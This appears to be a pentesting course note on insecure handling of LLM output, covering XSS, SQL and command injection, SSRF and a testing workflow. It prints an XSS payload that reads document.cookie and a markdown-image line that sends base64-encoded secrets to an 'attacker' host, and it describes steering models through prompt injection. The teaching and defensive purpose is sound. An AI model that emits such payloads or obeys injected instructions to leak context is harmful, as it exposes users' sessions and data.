---
tags: [ai, llm, output-handling, pentesting]
difficulty: intermediate
module: "51 - AI and LLM Security"
topic: "51.06 Insecure Output Handling"
---

# Insecure Output Handling

## Introduction
**Insecure output handling** (OWASP LLM02) is when an application **trusts LLM output** and passes it, unsanitized, to a downstream component — a browser, a shell, a database, an HTTP client, an `eval()`. The LLM's output is attacker-influenceable (via prompt injection), so trusting it is equivalent to trusting user input: it reintroduces classic injection bugs (**XSS, SQLi, command injection, SSRF, path traversal**) with the LLM as the conduit. This is one of the most impactful LLM issues because it converts "the model said something bad" into "the model's output executed something bad."

## The Core Mistake
```text
+---------------------------------------------------------------+
|                 INSECURE OUTPUT HANDLING                     |
+---------------------------------------------------------------+
|  (attacker influences) LLM output  ->  app uses it RAW in:    |
|     - HTML page         -> stored/reflected XSS               |
|     - SQL query         -> SQL injection                      |
|     - shell command     -> command injection / RCE            |
|     - HTTP request/URL  -> SSRF                                |
|     - file path         -> path traversal                     |
|     - eval()/code exec  -> RCE                                 |
|     - markdown/image     -> data exfil via auto-loaded URL     |
+---------------------------------------------------------------+
|  LLM output must be treated as UNTRUSTED user input.          |
+---------------------------------------------------------------+
```

## Common Manifestations
### XSS via rendered LLM output
A chatbot renders the model's answer as HTML/markdown. An attacker (via direct or indirect injection) makes the model output `<script>`/`<img onerror>`/an event handler → executes in the victim's browser:
```text
   injection -> model returns:  <img src=x onerror=alert(document.cookie)>
   app renders it unescaped -> XSS in the victim's session
```

### Data exfiltration via markdown images/links
Even without full XSS, if output is rendered as markdown, the model can be made to emit an image whose URL **encodes stolen context** — the victim's browser auto-fetches it, exfiltrating data:
```text
   ![x](https://attacker/log?d=<base64 of secret from context>)
```
A favorite payload for indirect injection ([[04]]) because it needs only image rendering.

### SQL / command / code injection
An app that asks the LLM to "generate a SQL query" or "produce a shell command" and then **runs it** inherits injection if the input/output isn't controlled. "Agentic" code-execution features that `eval` model output are direct RCE.

### SSRF via tool/URL output
If the model produces a URL the app then fetches (link preview, "open this", a browse tool), injection steers it to internal endpoints (cloud metadata, internal services) — SSRF ([[07 - Excessive Agency Tools and Plugins]] overlaps).

## Testing Workflow
```text
1. Find where output goes: rendered in browser? run as SQL/shell/code?
   used as a URL/path? fed to another system?
2. Via prompt injection ([[03]]/[[04]]), make the model emit a payload
   for that sink (XSS string, markdown image, SQL meta-chars, ../).
3. Confirm the downstream executes/renders it unsanitized.
4. For exfil: test markdown-image/link auto-loading of attacker URLs.
```
This is just classic injection testing with the LLM as the input source — apply your web/API injection knowledge to the model's output.

## Why It Matters
This bug class turns the inevitable (prompt injection) into the severe (XSS in users' sessions, RCE on the server, SQLi against the DB, SSRF into the cloud). It's where "LLM safety" and "application security" meet — and where the highest-severity LLM findings usually live, because the impact is concrete and uses well-understood exploit primitives.

## Defensive Notes
- **Treat LLM output as untrusted user input.** Context-encode/escape before rendering (HTML-encode → prevents XSS); never `eval`/exec model output; use parameterized queries; validate URLs/paths.
- Render model output as **plain text or sanitized markdown** with a strict allowlist (no raw HTML, no auto-loading external images for exfil-sensitive contexts); apply CSP.
- For code/SQL/command generation, run in a sandbox with no real privileges, or require human review; never wire model output directly to a powerful sink.
- Block exfiltration channels: disallow external resource loads in rendered output where context contains secrets.

## Related Notes
- [[03 - Prompt Injection]]
- [[04 - Indirect Prompt Injection and RAG Poisoning]]
- [[07 - Excessive Agency Tools and Plugins]]
- [[31 - Web LLM and Prompt Injection]]
